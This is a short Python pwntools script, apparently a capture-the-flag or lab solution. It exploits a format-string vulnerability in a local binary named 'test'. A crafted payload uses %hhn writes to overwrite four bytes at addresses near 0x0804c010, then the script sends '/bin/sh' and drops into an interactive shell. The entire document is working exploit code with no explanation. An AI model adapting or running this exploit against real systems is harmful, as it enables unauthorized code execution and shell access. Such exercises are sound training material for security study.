from pwn import *

payload = b'%96c%15$hhn%64c%16$hhn%64c%17$hhn%23c%18$hhn\x10\xc0\x04\x08\x11\xc0\x04\x08\x12\xc0\x04\x08\x13\xc0\x04\x08'  
io = process('../target/test')
io.send(payload)
io.send('/bin/sh')
io.recv()
io.interactive()